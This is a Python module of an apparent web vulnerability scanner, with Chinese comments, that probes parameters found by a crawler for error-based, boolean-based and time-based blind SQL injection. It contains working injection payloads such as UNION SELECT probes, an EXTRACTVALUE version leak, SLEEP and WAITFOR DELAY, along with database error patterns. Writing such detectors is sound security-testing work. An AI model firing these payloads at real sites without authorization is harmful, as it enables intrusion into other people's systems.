"""
SQL 注入检测模块（报错 / 布尔 / 时延盲注）
Author: 火柴 | GitHub: huocai250

v4.0 改进：
  - 测试爬虫发现的真实注入点（URL 参数 + 表单），而非仅猜测参数名
  - 并发测试各注入点
  - 时延盲注：先测基线响应时间，再二次确认，显著降低误报
"""
import re
import time
import statistics
from core.scanner import BaseScanner
from core.colors import log
from utils.http import build_url

ERROR_PATTERNS = [
    r"SQL syntax.*?MySQL", r"Warning.*?mysql_", r"MySQLSyntaxErrorException",
    r"check the manual that (corresponds to|fits) your MySQL",
    r"com\.mysql\.jdbc\.exceptions",
    r"Unclosed quotation mark", r"Microsoft OLE DB Provider for SQL Server",
    r"SQLServer JDBC Driver", r"Incorrect syntax near",
    r"ODBC SQL Server Driver", r"\[SQL Server\]",
    r"ORA-\d{5}", r"Oracle error", r"Oracle.*Driver", r"quoted string not properly terminated",
    r"PostgreSQL.*ERROR", r"Warning.*pg_", r"valid PostgreSQL result", r"Npgsql\.",
    r"PG::SyntaxError", r"ERROR:\s+syntax error at or near",
    r"SQLite/JDBCDriver", r"SQLite\.Exception", r"System\.Data\.SQLite",
    r"Warning.*sqlite_", r"SQLITE_ERROR",
    r"Syntax error.*in query expression", r"Data type mismatch",
    r"Microsoft Access Driver", r"JET Database Engine",
]

BOOLEAN_PAYLOADS = [
    ("' AND '1'='1", "' AND '1'='2"),
    (" AND 1=1",     " AND 1=2"),
    ("' AND 1=1--",  "' AND 1=2--"),
    (" OR 1=1",      " OR 1=2"),
]

TIME_PAYLOADS = [
    "'; WAITFOR DELAY '0:0:{d}'--",
    "' AND SLEEP({d})--",
    "1 AND (SELECT * FROM (SELECT(SLEEP({d})))a)--",
]

ERROR_PAYLOADS = [
    "'", '"', "';", '";', "' OR '", ") OR (", "' OR 1=1--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "1 ORDER BY 999--",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
]

COMMON_PARAMS = ["id", "page", "q", "search", "keyword", "cat",
                 "item", "user", "uid", "pid", "cid", "type", "sort"]

DELAY = 3   # 时延盲注注入的秒数


class SQLiScanner(BaseScanner):
    name = "sqli"

    def run(self):
        log("INFO", "SQL 注入检测（报错/布尔/时延，并发）...")
        targets = self.injection_targets(COMMON_PARAMS)
        if not targets:
            log("SKIP", "无可测试参数")
            return
        log("INFO", f"共 {len(targets)} 个参数点待测")
        self.map(self._test_param, targets)

    def _req(self, method, url, params):
        if method == "POST":
            return self.post(url, data=params)
        return self.get(build_url(url, params))

    def _test_param(self, target):
        url, method, params, pname = target
        if self._error_based(url, method, params, pname):
            return f"{pname}@{url}"
        if self._boolean_based(url, method, params, pname):
            return f"{pname}@{url}"
        if self._time_based(url, method, params, pname):
            return f"{pname}@{url}"
        return None

    def _error_based(self, url, method, params, pname):
        for payload in ERROR_PAYLOADS:
            test = dict(params); test[pname] = payload
            r = self._req(method, url, test)
            if r and self._has_sql_error(r.text):
                log("VULN", f"[报错注入] 参数: {pname} | Payload: {payload[:30]}")
                self.add("SQL 注入", "CRITICAL",
                         f"[报错注入] 参数 '{pname}' 存在 SQL 注入",
                         f"Payload: {payload} @ {url}", url=url)
                return True
        return False

    def _boolean_based(self, url, method, params, pname):
        base = dict(params)
        base_r = self._req(method, url, base)
        if not base_r:
            return False
        base_len = len(base_r.text)
        for true_p, false_p in BOOLEAN_PAYLOADS:
            t = dict(params); t[pname] = str(params.get(pname, "1")) + true_p
            f = dict(params); f[pname] = str(params.get(pname, "1")) + false_p
            tr = self._req(method, url, t)
            fr = self._req(method, url, f)
            if tr and fr:
                len_diff = abs(len(tr.text) - len(fr.text))
                # true 与基线接近、false 明显不同 → 疑似布尔盲注
                if len_diff > 50 and abs(len(tr.text) - base_len) < 20:
                    log("VULN", f"[布尔盲注] 参数: {pname} | 响应长度差: {len_diff}")
                    self.add("SQL 注入", "HIGH",
                             f"[布尔盲注] 参数 '{pname}' 疑似布尔盲注",
                             f"true_len={len(tr.text)} false_len={len(fr.text)} @ {url}",
                             url=url, confidence="疑似")
                    return True
        return False

    def _time_based(self, url, method, params, pname):
        # 先测量 2~3 次基线响应时间
        base_times = []
        for _ in range(2):
            start = time.time()
            self._req(method, url, dict(params))
            base_times.append(time.time() - start)
        base = statistics.median(base_times) if base_times else 0.0
        threshold = base + DELAY * 0.7        # 需明显高于基线

        for tmpl in TIME_PAYLOADS:
            payload = tmpl.format(d=DELAY)
            test = dict(params); test[pname] = payload
            start = time.time()
            r = self._req(method, url, test)
            elapsed = time.time() - start
            if r and elapsed >= threshold:
                # 二次确认：用更长延迟再打一次，避免偶发网络抖动误报
                confirm_payload = tmpl.format(d=DELAY + 2)
                test[pname] = confirm_payload
                s2 = time.time()
                self._req(method, url, test)
                e2 = time.time() - s2
                if e2 >= elapsed + 1:
                    log("VULN", f"[时延盲注] 参数: {pname} ({elapsed:.1f}s→{e2:.1f}s)")
                    self.add("SQL 注入", "HIGH",
                             f"[时延盲注] 参数 '{pname}' 确认时延盲注 "
                             f"(基线 {base:.1f}s, 注入后 {elapsed:.1f}s/{e2:.1f}s)",
                             f"Payload: {payload} @ {url}", url=url)
                    return True
        return False

    def _has_sql_error(self, text):
        return any(re.search(p, text, re.I) for p in ERROR_PATTERNS)
